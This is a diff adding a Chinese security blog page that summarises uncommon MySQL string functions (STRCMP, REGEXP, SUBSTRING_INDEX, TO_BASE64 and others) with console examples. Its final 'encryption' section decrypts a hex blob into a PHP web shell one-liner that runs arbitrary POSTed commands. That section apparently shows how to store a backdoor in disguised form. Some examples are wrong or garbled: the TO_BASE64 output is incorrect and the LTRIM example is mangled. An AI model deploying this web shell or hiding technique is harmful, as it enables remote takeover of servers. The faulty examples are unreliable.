@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>MySQL生僻函数总结 « 倾旋的博客</title>
+  <meta name="description" content="本文记录一些MySQL生僻函数">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2018-08-12/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">MySQL生僻函数总结</h1>
+    <p class="post-meta">Aug 12, 2018</p>
+  </header>
+
+  <article class="post-content">
+    <p>本文记录一些MySQL生僻函数
+<!--more--></p>
+<ul id="markdown-toc">
+  <li>
+<a href="#0x01-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0" id="markdown-toc-0x01-字符串函数">0X01 字符串函数</a>    <ul>
+      <li><a href="#strcmp" id="markdown-toc-strcmp">STRCMP</a></li>
+      <li><a href="#regexp" id="markdown-toc-regexp">REGEXP</a></li>
+      <li><a href="#upper" id="markdown-toc-upper">UPPER</a></li>
+      <li><a href="#lower" id="markdown-toc-lower">LOWER</a></li>
+      <li><a href="#lpad" id="markdown-toc-lpad">LPAD</a></li>
+      <li><a href="#ltrim" id="markdown-toc-ltrim">LTRIM</a></li>
+      <li><a href="#make_set" id="markdown-toc-make_set">MAKE_SET</a></li>
+      <li><a href="#octet_length" id="markdown-toc-octet_length">OCTET_LENGTH</a></li>
+      <li><a href="#locate" id="markdown-toc-locate">LOCATE</a></li>
+      <li><a href="#mid-substring" id="markdown-toc-mid-substring">MID SUBSTRING</a></li>
+      <li><a href="#substring_index" id="markdown-toc-substring_index">SUBSTRING_INDEX</a></li>
+      <li><a href="#to_base64" id="markdown-toc-to_base64">TO_BASE64</a></li>
+      <li><a href="#from_base64" id="markdown-toc-from_base64">FROM_BASE64</a></li>
+    </ul>
+  </li>
+  <li><a href="#0x02-%E5%8A%A0%E5%AF%86" id="markdown-toc-0x02-加密">0x02 加密</a></li>
+</ul>
+
+<h2 id="0x01-字符串函数">0X01 字符串函数</h2>
+
+<h3 id="strcmp">STRCMP</h3>
+
+<p><strong>STRCMP(expr1,expr2)</strong></p>
+
+<p>STRCMP() returns 0 if the strings are the same, -1 if the first argument is smaller than the second according to the current sort order, and 1 otherwise.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT STRCMP<span class="o">(</span><span class="s1">'text'</span>, <span class="s1">'text2'</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="nt">-1</span>
+mysql&gt; SELECT STRCMP<span class="o">(</span><span class="s1">'text2'</span>, <span class="s1">'text'</span><span class="o">)</span><span class="p">;</span>
+-&gt; 1
+mysql&gt; SELECT STRCMP<span class="o">(</span><span class="s1">'text'</span>, <span class="s1">'text'</span><span class="o">)</span><span class="p">;</span>
+-&gt; 0
+mysql&gt; SET @s1 <span class="o">=</span> _latin1 <span class="s1">'x'</span> COLLATE latin1_general_ci<span class="p">;</span>
+mysql&gt; SET @s2 <span class="o">=</span> _latin1 <span class="s1">'X'</span> COLLATE latin1_general_ci<span class="p">;</span>
+mysql&gt; SET @s3 <span class="o">=</span> _latin1 <span class="s1">'x'</span> COLLATE latin1_general_cs<span class="p">;</span>
+mysql&gt; SET @s4 <span class="o">=</span> _latin1 <span class="s1">'X'</span> COLLATE latin1_general_cs<span class="p">;</span>
+mysql&gt; SELECT STRCMP<span class="o">(</span>@s1, @s2<span class="o">)</span>, STRCMP<span class="o">(</span>@s3, @s4<span class="o">)</span><span class="p">;</span>
++------------------+------------------+
+| STRCMP<span class="o">(</span>@s1, @s2<span class="o">)</span> | STRCMP<span class="o">(</span>@s3, @s4<span class="o">)</span> |
++------------------+------------------+
+|0                 |1                 |
++------------------+------------------+
+</code></pre></div></div>
+
+<h3 id="regexp">REGEXP</h3>
+
+<p><strong>expr REGEXP pat, expr RLIKE pat</strong></p>
+
+<p>Regular expression operations use the character set and collation of the string expression and pattern arguments when deciding the type of a character and performing the comparison. If the arguments have different character sets or collations, coercibility rules apply as described in Section 10.8.4, “Collation Coercibility in Expressions”.</p>
+
+<p>If either argument is a binary string, the arguments are handled in case-sensitive fashion as binary strings.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT <span class="s1">'Michael!'</span> REGEXP <span class="s1">'.*'</span><span class="p">;</span>
++------------------------+
+| <span class="s1">'Michael!'</span> REGEXP <span class="s1">'.*'</span> |
++------------------------+
+|1                       |
++------------------------+
+mysql&gt; SELECT <span class="s1">'new*\n*line'</span> REGEXP <span class="s1">'new\*.\*line'</span><span class="p">;</span>
++---------------------------------------+
+| <span class="s1">'new*\n*line'</span> REGEXP <span class="s1">'new\*.\*line'</span> |
++---------------------------------------+
+|                                     0 |
++---------------------------------------+
+mysql&gt; SELECT <span class="s1">'a'</span> REGEXP <span class="s1">'^[a-d]'</span><span class="p">;</span>
++---------------------+
+| <span class="s1">'a'</span> REGEXP <span class="s1">'^[a-d]'</span> |
++---------------------+
+|                   1 |
++---------------------+
+mysql&gt; SELECT <span class="s1">'fo\nfo'</span> REGEXP <span class="s1">'^fo$'</span><span class="p">;</span>
+-&gt; 0
+mysql&gt; SELECT <span class="s1">'fofo'</span> REGEXP <span class="s1">'^fo'</span><span class="p">;</span>
+-&gt; 1
+mysql&gt; SELECT <span class="s1">'fo\no'</span> REGEXP <span class="s1">'^fo\no$'</span><span class="p">;</span>
+-&gt; 1
+mysql&gt; SELECT <span class="s1">'fo\no'</span> REGEXP <span class="s1">'^fo$'</span><span class="p">;</span>
+-&gt; 0
+mysql&gt; SELECT <span class="s1">'fofo'</span> REGEXP <span class="s1">'^f.*$'</span><span class="p">;</span>
+-&gt; 1
+mysql&gt; SELECT <span class="s1">'fo\r\nfo'</span> REGEXP <span class="s1">'^f.*$'</span><span class="p">;</span>
+-&gt; 1
+mysql&gt; SELECT <span class="s1">'Ban'</span> REGEXP <span class="s1">'^Ba*n'</span><span class="p">;</span>
+-&gt; 1
+mysql&gt; SELECT <span class="s1">'Baaan'</span> REGEXP <span class="s1">'^Ba*n'</span><span class="p">;</span>
+-&gt; 1
+mysql&gt; SELECT <span class="s1">'Bn'</span> REGEXP <span class="s1">'^Ba*n'</span><span class="p">;</span>
+-&gt; 1
+</code></pre></div></div>
+
+<h3 id="upper">UPPER</h3>
+
+<p><strong>UPPER(str)</strong></p>
+
+<p>Returns the string str with all characters changed to uppercase according to the current character set mapping. The default is latin1 (cp1252 West European).</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT UPPER<span class="o">(</span><span class="s1">'Hej'</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'HEJ'</span>
+</code></pre></div></div>
+
+<h3 id="lower">LOWER</h3>
+
+<p><strong>LOWER(str)</strong></p>
+
+<p>Returns the string str with all characters changed to lowercase according to the current character set mapping. The default is latin1 (cp1252 West European).</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT LOWER<span class="o">(</span><span class="s1">'QUADRATICALLY'</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'quadratically'</span>
+</code></pre></div></div>
+
+<h3 id="lpad">LPAD</h3>
+
+<p><strong>LPAD(str,len,padstr)</strong></p>
+
+<p>Returns the string str, left-padded with the string padstr to a length of len characters. If str is longer than len, the return value is shortened to len characters.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+mysql&gt; SELECT LPAD<span class="o">(</span><span class="s1">'hi'</span>,4,<span class="s1">'??'</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'??hi'</span>
+mysql&gt; SELECT LPAD<span class="o">(</span><span class="s1">'hi'</span>,1,<span class="s1">'??'</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'h'</span>
+</code></pre></div></div>
+
+<h3 id="ltrim">LTRIM</h3>
+
+<p><strong>LTRIM(str)</strong></p>
+
+<p>Returns the string str with leading space characters removed.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT LTRIM<span class="o">(</span><span class="s1">'
+-&gt; '</span>barbar<span class="s1">'
+</span></code></pre></div></div>
+
+<h3 id="make_set">MAKE_SET</h3>
+
+<p><strong>MAKE_SET(bits,str1,str2,…)</strong></p>
+
+<p>Returns a set value (a string containing substrings separated by , characters) consisting of the strings that have the corresponding bit in bits set. str1 corresponds to bit 0, str2 to bit 1, and soon. NULL values in str1, str2, … are not appended to the result.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT MAKE_SET<span class="o">(</span>1,<span class="s1">'a'</span>,<span class="s1">'b'</span>,<span class="s1">'c'</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'a'</span>
+mysql&gt; SELECT MAKE_SET<span class="o">(</span>1 | 4,<span class="s1">'hello'</span>,<span class="s1">'nice'</span>,<span class="s1">'world'</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'hello,world'</span>
+mysql&gt; SELECT MAKE_SET<span class="o">(</span>1 | 4,<span class="s1">'hello'</span>,<span class="s1">'nice'</span>,NULL,<span class="s1">'world'</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'hello'</span>
+mysql&gt; SELECT MAKE_SET<span class="o">(</span>0,<span class="s1">'a'</span>,<span class="s1">'b'</span>,<span class="s1">'c'</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">''</span>
+</code></pre></div></div>
+
+<h3 id="octet_length">OCTET_LENGTH</h3>
+
+<p><strong>OCTET_LENGTH(str)</strong></p>
+
+<p>OCTET_LENGTH() is a synonym for LENGTH().</p>
+
+<p>Returns the length of the string str, measured in bytes. A multibyte character counts as multiple bytes. This means that for a string containing five 2-byte characters, LENGTH() returns 10, whereas CHAR_LENGTH() returns 5.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT LENGTH<span class="o">(</span><span class="s1">'text'</span><span class="o">)</span><span class="p">;</span>
+-&gt; 4
+</code></pre></div></div>
+
+<h3 id="locate">LOCATE</h3>
+
+<p><strong>LOCATE(substr,str), LOCATE(substr,str,pos)</strong></p>
+
+<p>The first syntax returns the position of the first occurrence of substring substr in string str. The second syntax returns the position of the first occurrence of substring substr in string str, starting at position pos. Returns 0 if substr is not in str. Returns NULL if substr or str is NULL.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT LOCATE<span class="o">(</span><span class="s1">'bar'</span>, <span class="s1">'foobarbar'</span><span class="o">)</span><span class="p">;</span>
+-&gt; 4
+mysql&gt; SELECT LOCATE<span class="o">(</span><span class="s1">'xbar'</span>, <span class="s1">'foobar'</span><span class="o">)</span><span class="p">;</span>
+-&gt; 0
+mysql&gt; SELECT LOCATE<span class="o">(</span><span class="s1">'bar'</span>, <span class="s1">'foobarbar'</span>, 5<span class="o">)</span><span class="p">;</span>
+-&gt; 7
+</code></pre></div></div>
+
+<h3 id="mid-substring">MID SUBSTRING</h3>
+
+<p><strong>MID(str,pos,len)</strong></p>
+
+<p>MID(str,pos,len) is a synonym for SUBSTRING(str,pos,len).</p>
+
+<p><strong>SUBSTRING</strong></p>
+
+<ul>
+  <li>SUBSTRING(str,pos), SUBSTRING(str FROM pos)</li>
+  <li>SUBSTRING(str,pos,len),</li>
+  <li>SUBSTRING(str FROM pos FOR len)</li>
+</ul>
+
+<p>The forms without a len argument return a substring from string str starting at position pos.
+The forms with a len argument return a substring len characters long from string str, starting at position pos. The forms that use FROM are standard SQL syntax.</p>
+
+<p>It is also possible to use a negative value for pos. In this case, the beginning of the substring is pos characters from the end of the string, rather than the beginning. A negative value may be used for pos in any of the forms of this function.</p>
+
+<p>For all forms of SUBSTRING(), the position of the first character in the string from which the substring is to be extracted is reckoned as 1.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT SUBSTRING<span class="o">(</span><span class="s1">'Quadratically'</span>,5<span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'ratically'</span>
+mysql&gt; SELECT SUBSTRING<span class="o">(</span><span class="s1">'foobarbar'</span> FROM 4<span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'barbar'</span>
+mysql&gt; SELECT SUBSTRING<span class="o">(</span><span class="s1">'Quadratically'</span>,5,6<span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'ratica'</span>
+mysql&gt; SELECT SUBSTRING<span class="o">(</span><span class="s1">'Sakila'</span>, <span class="nt">-3</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'ila'</span>
+mysql&gt; SELECT SUBSTRING<span class="o">(</span><span class="s1">'Sakila'</span>, <span class="nt">-5</span>, 3<span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'aki'</span>
+mysql&gt; SELECT SUBSTRING<span class="o">(</span><span class="s1">'Sakila'</span> FROM <span class="nt">-4</span> FOR 2<span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'ki'</span>
+</code></pre></div></div>
+
+<h3 id="substring_index">SUBSTRING_INDEX</h3>
+
+<p><strong>SUBSTRING_INDEX(str,delim,count)</strong></p>
+
+<p>Returns the substring from string str before count occurrences of the delimiter delim. If count is positive, everything to the left of the final delimiter (counting from the left) is returned. If count is negative, everything to the right of the final delimiter (counting from the right) is returned.
+SUBSTRING_INDEX() performs a case-sensitive match when searching for delim.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT SUBSTRING_INDEX<span class="o">(</span><span class="s1">'www.mysql.com'</span>, <span class="s1">'.'</span>, 2<span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'www.mysql'</span>
+mysql&gt; SELECT SUBSTRING_INDEX<span class="o">(</span><span class="s1">'www.mysql.com'</span>, <span class="s1">'.'</span>, <span class="nt">-2</span><span class="o">)</span><span class="p">;</span>
+-&gt; <span class="s1">'mysql.com'</span>
+</code></pre></div></div>
+
+<h3 id="to_base64">TO_BASE64</h3>
+
+<p><strong>TO_BASE64(str)</strong></p>
+
+<p>Converts the string argument to base-64 encoded form and returns the result as a character string with the connection character set and collation. If the argument is not a string, it is converted to a string before conversion takes place. The result is NULL if the argument is NULL. Base-64 encoded strings can be decoded using the FROM_BASE64() function.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT TO_BASE64<span class="o">(</span><span class="s1">'abc'</span><span class="o">)</span>, FROM_BASE64<span class="o">(</span>TO_BASE64<span class="o">(</span><span class="s1">'abc'</span><span class="o">))</span><span class="p">;</span>
+-&gt; <span class="s1">'JWJj'</span>, <span class="s1">'abc'</span>
+</code></pre></div></div>
+
+<h3 id="from_base64">FROM_BASE64</h3>
+
+<p>Takes a string encoded with the base-64 encoded rules used by TO_BASE64() and returns the
+decoded result as a binary string. The result is NULL if the argument is NULL or not a valid base-64 string. See the description of TO_BASE64() for details about the encoding and decoding rules.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT TO_BASE64<span class="o">(</span><span class="s1">'abc'</span><span class="o">)</span>, FROM_BASE64<span class="o">(</span>TO_BASE64<span class="o">(</span><span class="s1">'abc'</span><span class="o">))</span><span class="p">;</span>
+-&gt; <span class="s1">'JWJj'</span>, <span class="s1">'abc'</span>
+</code></pre></div></div>
+
+<h2 id="0x02-加密">0x02 加密</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> SELECT AES_DECRYPT<span class="o">(</span>UNHEX<span class="o">(</span><span class="s2">"4B8A46D45BFA21AB2301907A63E868E3293216683CF8FF8A08A4C96986627A59"</span><span class="o">)</span>,<span class="s2">"PASS"</span><span class="o">)</span><span class="p">;</span>
++-----------------------------------------------------------------------------------------------+
+| AES_DECRYPT<span class="o">(</span>UNHEX<span class="o">(</span><span class="s2">"4B8A46D45BFA21AB2301907A63E868E3293216683CF8FF8A08A4C96986627A59"</span><span class="o">)</span>,<span class="s2">"PASS"</span><span class="o">)</span> |
++-----------------------------------------------------------------------------------------------+
+| &lt;?php <span class="nb">eval</span><span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">"cmd"</span><span class="o">])</span><span class="p">;</span>?&gt;                                                                  |
++-----------------------------------------------------------------------------------------------+
+1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</code></pre></div></div>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
